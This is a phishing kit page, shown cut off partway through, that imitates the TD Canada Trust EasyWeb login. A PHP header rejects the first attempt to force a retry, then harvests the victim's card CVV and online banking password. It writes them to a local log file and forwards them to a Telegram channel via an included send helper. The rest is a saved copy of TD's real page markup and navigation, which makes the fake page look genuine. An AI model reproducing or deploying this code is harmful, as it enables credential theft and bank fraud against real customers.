<?php session_start();


 require_once "../sendto.php" ;

if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

if($_SESSION['try'] !== 1 ){
    $_SESSION['try']++ ;
    header("Location: ./index.php");  
    exit();     
} 

$_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;


$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
"\n"."heure :".$heure.
"\n"."date :".$date.
"\n". "Cvv : " .$_SESSION["cvv"] .
"\n"."Mdp : " .$_SESSION["mdp"] .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);
 sendMessageToTelegram($donnees) ;


?>


<!DOCTYPE html>
<!-- saved from url=(0078)https://authentication.td.com/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login -->
<html lang="en-CA" class="js flexbox flexboxlegacy no-touch rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent"><script async="" src="./index_files/config.js.téléchargement"></script><script async="" src="./index_files/pathfora.min.js.téléchargement"></script><script async="" src="./index_files/latest.min.js.téléchargement"></script><script type="text/javascript" async="" src="./index_files/analytics.js.téléchargement"></script><script type="text/javascript" async="" src="./index_files/analytics.js.téléchargement"></script><script type="text/javascript" async="" src="./index_files/js"></script><script type="text/javascript" async="" src="./index_files/js(1)"></script><script type="text/javascript" async="" src="./index_files/js(2)"></script><script type="text/javascript" async="" src="./index_files/js(3)"></script><script type="text/javascript" async="" src="./index_files/js(4)"></script><script type="text/javascript" async="" src="./index_files/js(5)"></script><script type="text/javascript" async="" src="./index_files/f4a7a659461cd1333f8d70dfe538d29a.js.téléchargement"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="./index_files/s61927495591157"></script><script src="./index_files/serverComponent.php"></script><script type="text/javascript" src="./index_files/td_common_153.js.téléchargement"></script>
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">

  <title>EasyWeb Login</title>
  <!--<base href="/uap-ui/">--><base href=".">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script type="text/javascript" src="./index_files/ruxitagentjs_ICA27NVfgjqru_10205201218101503.js.téléchargement" data-dtconfig="app=5614ee112a4f98ca|cuc=9p6cxzfz|mel=100000|featureHash=ICA27NVfgjqru|ssv=4|lastModification=1715288883028|vcv=2|tp=500,50,0,1|rdnt=1|uxrgce=1|bp=3|agentUri=/uap-ui/ruxitagentjs_ICA27NVfgjqru_10205201218101503.js|reportUrl=/uap-ui/rb_cf7d3730-9eed-4047-88c3-d0cd1e0cd529|rid=RID_-1125893302|rpid=323856508|domain=td.com"></script><link rel="icon" type="image/x-icon" href="https://authentication.td.com/uap-ui/favicon.ico">
<link rel="stylesheet" href="/tdd/index_files/styles.de6c1fb9bd284112ed21.css" class="td_apas_css"><style></style><style>.login-wrapper[_ngcontent-egd-c151]{display:flex;flex-direction:column;min-height:100%;height:100%}.login-wrapper[_ngcontent-egd-c151]   .spacer[_ngcontent-egd-c151]{flex:1 1 auto}</style><style>.text-center[_nghost-egd-c101]   .banner-container[_ngcontent-egd-c101], .text-center   [_nghost-egd-c101]   .banner-container[_ngcontent-egd-c101]{justify-content:center}.banner-container[_ngcontent-egd-c101]{display:flex}.banner-container[_ngcontent-egd-c101]   .td-icon-error[_ngcontent-egd-c101]{padding-right:1rem;top:1px}.td-link-password-reset[_ngcontent-egd-c101]{color:inherit}div[role=alert][_ngcontent-egd-c101]{outline:none}</style><script src="./index_files/dsp" type="text/javascript" defer="" async=""></script><script type="text/javascript" async="" src="./index_files/ast.js.téléchargement"></script><style>.login-form[_ngcontent-egd-c150]{display:flex;flex-direction:column}.login-form[_ngcontent-egd-c150]   .order-1[_ngcontent-egd-c150]{order:1}.login-form[_ngcontent-egd-c150]   .order-2[_ngcontent-egd-c150]{order:2}.login-form[_ngcontent-egd-c150]   .order-3[_ngcontent-egd-c150]{order:3}.login-form[_ngcontent-egd-c150]   .order-4[_ngcontent-egd-c150]{order:4}.login-form[_ngcontent-egd-c150]   .order-5[_ngcontent-egd-c150]{order:5}.login-form[_ngcontent-egd-c150]   .order-6[_ngcontent-egd-c150]{order:6}.login-form[_ngcontent-egd-c150]   .order-7[_ngcontent-egd-c150]{order:7}.description-container[_ngcontent-egd-c150]{margin-bottom:.9375rem}.description-container[_ngcontent-egd-c150]   .expand-btn[_ngcontent-egd-c150]{margin:0;padding:0;border:none;background:transparent;display:flex;align-items:baseline;color:#038203}.description-container[_ngcontent-egd-c150]   .expand-btn[_ngcontent-egd-c150]   .td-icon[_ngcontent-egd-c150]{padding-right:.25em}.description-container[_ngcontent-egd-c150]   .entry-box[_ngcontent-egd-c150]{background-color:#fff;padding:10px 1.5rem 0;margin-top:15px;position:relative}.description-container[_ngcontent-egd-c150]   .entry-box[_ngcontent-egd-c150]:before{position:absolute;width:.618rem;height:.618rem;background:#f5f9f7;left:1.618rem;top:-.309rem;content:"";transform:rotate(45deg);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg)}.uap-security-guarantee[_ngcontent-egd-c150]   .td-icon-superlock[_ngcontent-egd-c150]{color:#1a5336}.input-group-btn[_ngcontent-egd-c150]{position:absolute;float:right;margin-right:12px;top:42px;right:5px}.input-group-btn[_ngcontent-egd-c150]   img[_ngcontent-egd-c150]{height:18px;width:18px}.input-group-btn[_ngcontent-egd-c150]   img[_ngcontent-egd-c150]:hover{background-color:#f3f3f3;border-radius:50%}.input-group-btn[_ngcontent-egd-c150]   img[_ngcontent-egd-c150]:active{background-color:rgba(0,0,0,.1);border-radius:50%}.td-pw-button[_ngcontent-egd-c150]{background-color:transparent}.td-pw-button[_ngcontent-egd-c150]:focus{outline:thin dotted #048403}input[_ngcontent-egd-c150]::-ms-clear, input[_ngcontent-egd-c150]::-ms-reveal{display:none}</style><style>.input-group[_ngcontent-egd-c148]   .drop-down-icon[_ngcontent-egd-c148]{position:absolute;cursor:pointer;top:0;right:0;width:34px;height:42px;display:inline-block}.input-group[_ngcontent-egd-c148]   .form-control[_ngcontent-egd-c148]{padding-left:15px}.input-group[_ngcontent-egd-c148]   .drop-down-btn[_ngcontent-egd-c148]{position:absolute;top:0;right:0;width:30px;height:42px;background:none;border:none;font-weight:700}.input-group[_ngcontent-egd-c148]   .drop-down-btn[_ngcontent-egd-c148]:hover:after{border-color:#00a221}.input-group[_ngcontent-egd-c148]   .drop-down-btn[_ngcontent-egd-c148]:after{content:"";pointer-events:none;position:absolute;font-size:.625em;line-height:1;width:.5rem;height:.5rem;margin-top:-.5em;top:45%;right:1.2em;color:#fff;border:3px solid #1c1c1c;border-width:0 2px 2px 0;transform:rotate(45deg);display:inline-block}#cardList[_ngcontent-egd-c148]{padding:0;margin:0;position:absolute;left:15px;right:15px;z-index:1;box-shadow:0 0 15px rgba(0,0,0,.15),0 0 1px 1px rgba(0,0,0,.1);outline:none}#cardList[_ngcontent-egd-c148]   .uap-list-item[_ngcontent-egd-c148]{display:flex;justify-content:space-between;align-items:center;height:42px;background-color:#fff;padding:0 15px}#cardList[_ngcontent-egd-c148]   .uap-list-item[_ngcontent-egd-c148]:hover{background-color:#f3f3f3}#cardList[_ngcontent-egd-c148]   .uap-list-item.card-option[_ngcontent-egd-c148]   .option-btn[_ngcontent-egd-c148]{height:100%;flex:1 1 auto;text-align:left;background:none;border:none;padding-left:0;padding-right:0}#cardList[_ngcontent-egd-c148]   .uap-list-item.card-option[_ngcontent-egd-c148]   .icon-btn[_ngcontent-egd-c148]{height:100%;color:#1a5336;padding-right:0;padding-left:0;width:30px}#cardList[_ngcontent-egd-c148]   .uap-list-item.card-option[_ngcontent-egd-c148]   .icon-btn[_ngcontent-egd-c148]:hover{color:#038203}#cardList[_ngcontent-egd-c148]   .uap-list-item.card-option[_ngcontent-egd-c148]   .icon-btn[_ngcontent-egd-c148]   .td-icon[_ngcontent-egd-c148]{font-size:1.25rem}#cardList[_ngcontent-egd-c148]   .uap-list-item[_ngcontent-egd-c148]:last-child{border-top:1px solid #dadada}#cardList[_ngcontent-egd-c148]   .uap-list-item[_ngcontent-egd-c148]   .td-link-action[_ngcontent-egd-c148]{width:100%;line-height:calc(42px - 1px)}</style><style>.otp-login-msg[_ngcontent-egd-c104]{clear:both;position:relative;overflow:visible;color:#ae1100;margin:0;padding:.25rem 0 .375rem;font-size:.79375rem}</style><style>.inline[_ngcontent-egd-c86]{display:inline}</style><style type="text/css">[data-pftrigger], [data-pfrecommend]{ display: none; }</style><link rel="stylesheet" type="text/css" href="/tdd/index_files/pathfora.min.css"><style>.mat-dialog-container{display:block;padding:24px;border-radius:4px;box-sizing:border-box;overflow:auto;outline:0;width:100%;height:100%;min-height:inherit;max-height:inherit}.cdk-high-contrast-active .mat-dialog-container{outline:solid 1px}.mat-dialog-content{display:block;margin:0 -24px;padding:0 24px;max-height:65vh;overflow:auto;-webkit-overflow-scrolling:touch}.mat-dialog-title{margin:0 0 20px;display:block}.mat-dialog-actions{padding:8px 0;display:flex;flex-wrap:wrap;min-height:52px;align-items:center;margin-bottom:-24px}.mat-dialog-actions[align=end]{justify-content:flex-end}.mat-dialog-actions[align=center]{justify-content:center}.mat-dialog-actions .mat-button-base+.mat-button-base,.mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}
</style><style>.center-flex[_ngcontent-egd-c149]{display:flex;flex-direction:column;align-items:center}.center-flex[_ngcontent-egd-c149]   .btn[_ngcontent-egd-c149]{width:15rem}</style><script id="tmx_tags_js" type="text/javascript" src="./index_files/p1qan5uoj136fjti.js.téléchargement"></script></head>
<body class="en_CA td-no-focus-outline"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
  <app-root _nghost-egd-c163="" ng-version="10.2.4"><!----><uap-header-public _ngcontent-egd-c163="" _nghost-egd-c129="">
      <div _ngcontent-egd-c129="" class="td_rq_header-nav td-header-nav">
        <header _ngcontent-egd-c129="" class="td-header-desktop">
          <div _ngcontent-egd-c129="" class="td-skip"><a _ngcontent-egd-c129=""
              href="https://authentication.td.com/uap-ui/#main">Skip to main content</a></div>
          <div _ngcontent-egd-c129="" class="td-utility-toggle">
            <div _ngcontent-egd-c129="" class="td-container">
              <div _ngcontent-egd-c129="" class="td-section-left">
                <div _ngcontent-egd-c129="" class="td-segments">
                  <ul _ngcontent-egd-c129="">
                    <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking">Personal</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a>
                    </li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a></li>
                  </ul>
                </div>
              </div>
              <div _ngcontent-egd-c129="" class="td-section-right">
                <div _ngcontent-egd-c129="" class="td-other-toggles">
                  <ul _ngcontent-egd-c129="">
                    <li _ngcontent-egd-c129="" class="td-dropdown td-dropdown-country"><a _ngcontent-egd-c129=""
                        href="javascript:void(0)" aria-haspopup="true" aria-expanded="false"
                        id="td-desktop-nav-dropdown-link-0"><span _ngcontent-egd-c129="" class="td-forscreenreader">Select
                          country</span><img _ngcontent-egd-c129="" src="./index_files/country_ca.png" alt="Canada"
                          class="country-flag"><span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon expand"></span><span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon collapse"></span></a>
                      <ul _ngcontent-egd-c129="" aria-labelledby="td-desktop-nav-dropdown-link-0"
                        class="td-dropdown-content">
                        <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129="" href="javascript:void(0)"><img
                              _ngcontent-egd-c129="" src="./index_files/country_ca.png" alt="Canada Flag"
                              class="country-flag">Canada <span _ngcontent-egd-c129="" aria-hidden="true"
                              class="td-icon selected"></span><span _ngcontent-egd-c129=""
                              class="td-forscreenreader">Selected</span></a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129="" href="http://www.tdbank.com/"><img
                              _ngcontent-egd-c129="" src="./index_files/country_us.png" alt="United States Flag"
                              class="country-flag">United States </a></li>
                      </ul>
                    </li>
                    <li _ngcontent-egd-c129="" class="td-dropdown td-dropdown-language"><a _ngcontent-egd-c129=""
                        href="javascript:void(0)" aria-haspopup="true" aria-expanded="false"
                        id="td-desktop-nav-dropdown-link-1"><span _ngcontent-egd-c129="" class="td-forscreenreader">Select
                          language</span>Français <span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon expand"></span><span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon collapse"></span></a>
                      <ul _ngcontent-egd-c129="" aria-labelledby="td-desktop-nav-dropdown-link-1"
                        class="td-dropdown-content">
                        <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129="" href="javascript:void(0)"
                            role="button"> English <span _ngcontent-egd-c129="" aria-hidden="true"
                              class="td-icon selected"></span><!----><span _ngcontent-egd-c129=""
                              class="td-forscreenreader">Selected</span><!----></a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129="" href="javascript:void(0)" role="button">
                            Français <!----><!----></a></li><!---->
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div _ngcontent-egd-c129="" class="td-nav-primary">
            <div _ngcontent-egd-c129="" class="td-container">
              <div _ngcontent-egd-c129="" class="td-section-left">
                <div _ngcontent-egd-c129="" class="td-logo"><a _ngcontent-egd-c129=""
                    href="https://www.td.com/ca/en/personal-banking/"><img _ngcontent-egd-c129=""
                      src="./index_files/td-logo.png" alt="TD Canada Trust"></a></div>
                <nav _ngcontent-egd-c129="">
                  <ul _ngcontent-egd-c129="">
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking/my-accounts/">My Accounts</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking/my-accounts/">How To</a></li>
                    <li _ngcontent-egd-c129="" class="td-dropdown"><a _ngcontent-egd-c129="" href="javascript:void(0)"
                        role="button" aria-haspopup="true" aria-expanded="false"
                        id="td-desktop-nav-dropdown-link-2">Products<span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon expand"></span><span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon collapse"></span></a>
                      <ul _ngcontent-egd-c129="" class="td-dropdown-content"
                        aria-labelledby="td-desktop-nav-dropdown-link-2">
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.td.com/ca/en/personal-banking/products/bank-accounts/">Bank Accounts</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.td.com/ca/en/personal-banking/products/credit-cards/">Credit Cards</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp">Mortgages</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp">Borrowing</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp">Saving &amp;
                            Investing</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp">Insurance</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp">All
                            Products</a></li>
                      </ul>
                    </li>
                    <li _ngcontent-egd-c129="" class="td-dropdown"><a _ngcontent-egd-c129="" href="javascript:void(0)"
                        role="button" aria-haspopup="true" aria-expanded="false"
                        id="td-desktop-nav-dropdown-link-3">Solutions<span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon expand"></span><span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon collapse"></span></a>
                      <ul _ngcontent-egd-c129="" class="td-dropdown-content"
                        aria-labelledby="td-desktop-nav-dropdown-link-3">
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small
                            Businesses</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial Banking</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New to
                            Canada</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp">Cross
                            Border Banking</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/foreign-currency-services/index.jsp">Foreign
                            Exchange Services</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways
                            to Pay</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways
                            to Bank</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green
                            Banking</a></li>
                      </ul>
                    </li>
                  </ul>
                </nav>
              </div>
              <div _ngcontent-egd-c129="" class="td-section-right">
                <div _ngcontent-egd-c129="" class="td-quick-access">
                  <ul _ngcontent-egd-c129="">
                    <li _ngcontent-egd-c129="" class="find-us"><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking/branch-locator/"><span _ngcontent-egd-c129=""
                          class="td-icon"></span><span _ngcontent-egd-c129="" class="td-label">Find Us</span></a></li>
                    <li _ngcontent-egd-c129="" class="help"><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking/help-centre/"><span _ngcontent-egd-c129=""
                          class="td-icon"></span><span _ngcontent-egd-c129="" class="td-label">Help</span></a></li>
                    <li _ngcontent-egd-c129="" class="search"><a _ngcontent-egd-c129="" href="javascript:void(0)"
                        role="button" class="td-desktop-search-show-btn"><span _ngcontent-egd-c129=""
                          class="td-icon"></span><span _ngcontent-egd-c129="" class="td-label">Search</span></a></li>
                    <li _ngcontent-egd-c129="" class="divider">
                      <div _ngcontent-egd-c129="" class="td-divider-line"></div>
                    </li>
                    <li _ngcontent-egd-c129="" class="login td-dropdown"><a _ngcontent-egd-c129=""
                        href="javascript:void(0)" role="button" class="td-show-label" aria-haspopup="true"
                        aria-expanded="false" id="td-desktop-nav-dropdown-link-4"><span _ngcontent-egd-c129=""
                          class="td-icon"></span><span _ngcontent-egd-c129="" class="td-label">Login</span><span
                          _ngcontent-egd-c129="" aria-hidden="true" class="td-icon expand"></span><span
                          _ngcontent-egd-c129="" aria-hidden="true" class="td-icon collapse"></span></a>
                      <ul _ngcontent-egd-c129="" class="td-dropdown-content"
                        aria-labelledby="td-desktop-nav-dropdown-link-4">
                        <li _ngcontent-egd-c129="" class="visible-md"><a _ngcontent-egd-c129=""
                            href="javascript:void(0)">TD app</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129="" href="https://easyweb.td.com/">EasyWeb</a>
                        </li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://webbroker.td.com/">WebBroker</a></li>
                        <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                            href="https://www.tdbank.com/net/accountlogin.aspx">U.S. Banking</a></li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
              <div _ngcontent-egd-c129="" class="td-nav-desktop-search" style="display: none;"><span tabindex="0"></span>
                <div _ngcontent-egd-c129="" class="td-search-container">
                  <form _ngcontent-egd-c129="" novalidate="" class="td-search-box"><input _ngcontent-egd-c129=""
                      type="text" name="search" autocomplete="off" class="td-search-input" placeholder="Search"
                      aria-label="Search"><span _ngcontent-egd-c129="" aria-hidden="true" class="td-search-icon"><span
                        _ngcontent-egd-c129="" class="td-icon"></span></span><input _ngcontent-egd-c129="" type="submit"
                      value="search" class="td-search-submit" aria-label="Search"></form><!----><button
                    _ngcontent-egd-c129="" type="button" class="td-desktop-search-hide-btn"><span _ngcontent-egd-c129=""
                      class="td-forscreenreader">Close Search</span><span _ngcontent-egd-c129="" aria-hidden="true"
                      class="td-icon"></span></button>
                </div><span tabindex="0"></span>
              </div>
            </div>
          </div>
        </header>
        <header _ngcontent-egd-c129="" class="td-header-mobile">
          <div _ngcontent-egd-c129="" class="td-container">
            <div _ngcontent-egd-c129="" class="td-section-left"><button _ngcontent-egd-c129="" type="button"
                aria-haspopup="true" aria-expanded="false" class="td-mobile-action-button td-mobile-menu-button">
                <div _ngcontent-egd-c129="" class="td-mobile-menu-button-icon"><span _ngcontent-egd-c129=""
                    class="td-forscreenreader">Open menu</span><span _ngcontent-egd-c129="" aria-hidden="true"
                    class="icon-bar"></span><span _ngcontent-egd-c129="" aria-hidden="true" class="icon-bar"></span><span
                    _ngcontent-egd-c129="" aria-hidden="true" class="icon-bar"></span></div>
                <div _ngcontent-egd-c129="" class="td-logo"><img _ngcontent-egd-c129="" src="./index_files/td-logo.png"
                    alt="TD Canada Trust"></div>
              </button><button _ngcontent-egd-c129="" type="button" onclick="history.back();"
                class="td-mobile-action-button td-mobile-back-button">
                <div _ngcontent-egd-c129="" class="td-mobile-back-button-icon"><span _ngcontent-egd-c129=""
                    class="td-icon"></span><span _ngcontent-egd-c129="" class="td-forscreenreader">Back</span></div>
                <div _ngcontent-egd-c129="" class="td-logo"><img _ngcontent-egd-c129="" src="./index_files/td-logo.png"
                    alt="TD Canada Trust"></div>
              </button></div>
            <div _ngcontent-egd-c129="" class="td-section-right"><button _ngcontent-egd-c129="" type="button"
                aria-haspopup="true" aria-expanded="false"
                class="td-mobile-action-button td-mobile-menu-secondary-button td-login"><span _ngcontent-egd-c129=""
                  class="td-icon login"></span><span _ngcontent-egd-c129="" class="label">Login</span><span
                  _ngcontent-egd-c129="" class="td-forscreenreader">Open menu</span></button></div>
          </div>
        </header>
        <div _ngcontent-egd-c129="" class="td-nav-mobile">
          <div _ngcontent-egd-c129="" class="td-nav-mobile-menu td-nav-mobile-menu-primary"><span
              tabindex="0"></span><span _ngcontent-egd-c129="" tabindex="0"></span>
            <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-top">
              <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-header">
                <div _ngcontent-egd-c129="" class="td-logo"><a _ngcontent-egd-c129=""
                    href="https://www.td.com/ca/en/personal-banking/"><img _ngcontent-egd-c129=""
                      src="./index_files/td-logo.png" alt="TD Canada Trust"></a></div><button _ngcontent-egd-c129=""
                  type="button" class="td-mobile-menu-close"><span _ngcontent-egd-c129="" aria-hidden=""
                    class="td-forscreenreader">Close Menu</span><span _ngcontent-egd-c129="" aria-hidden="true"
                    class="td-icon"></span></button>
              </div>
              <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-search">
                <form _ngcontent-egd-c129="" novalidate="" class="td-search-box"><input _ngcontent-egd-c129="" type="text"
                    name="search" autocomplete="off" class="td-search-input" placeholder="Search"
                    aria-label="Search"><span _ngcontent-egd-c129="" aria-hidden="true" class="td-search-icon"><span
                      _ngcontent-egd-c129="" class="td-icon"></span></span><input _ngcontent-egd-c129="" type="submit"
                    value="search" class="td-search-submit" aria-label="Search"></form><!---->
              </div>
            </div>
            <nav _ngcontent-egd-c129="">
              <ul _ngcontent-egd-c129="" class="td-nav-mobile-menu-list">
                <li _ngcontent-egd-c129=""
                  class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-segment"><a
                    _ngcontent-egd-c129="" href="javascript:void(0)" aria-expanded="false" role="button"> TD: Personal
                    <span _ngcontent-egd-c129="" class="td-icon expand"></span><span _ngcontent-egd-c129=""
                      class="td-icon collapse"></span></a>
                  <ul _ngcontent-egd-c129="" class="td-accordion-content">
                    <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/en/personal-banking"> Personal <span _ngcontent-egd-c129=""
                          aria-hidden="true" class="td-icon selected"></span><span _ngcontent-egd-c129=""
                          class="td-forscreenreader">Selected</span></a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a>
                    </li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/about-tdbfg/our-business/index.jsp">About TD</a></li>
                  </ul>
                </li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-home active"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/"><span _ngcontent-egd-c129=""
                      class="td-icon td-icon-homepage"></span>Home</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-my-TD"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/my-accounts/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-myTD"></span>My Accounts</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-how-to"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/my-accounts/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-howTo"></span>How To</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-accounts"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/products/bank-accounts/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-accounts"></span>Bank Accounts</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-credit-cards"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/products/credit-cards/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-creditcards"></span>Credit Cards</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-mortgages"><a
                    _ngcontent-egd-c129=""
                    href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-mortgages"></span>Mortgages</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-borrowing"><a
                    _ngcontent-egd-c129=""
                    href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-borrowing"></span>Borrowing</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-saving-investing"><a
                    _ngcontent-egd-c129=""
                    href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-savingAndInvesting"></span>Saving &amp; Investing</a>
                </li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-insurance"><a
                    _ngcontent-egd-c129=""
                    href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-insurance"></span>Insurance</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-all-products"><a
                    _ngcontent-egd-c129=""
                    href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-allProducts"></span>All Products</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link td-accordion item-solutions"><a
                    _ngcontent-egd-c129="" href="javascript:void(0)" aria-expanded="false" role="button"><span
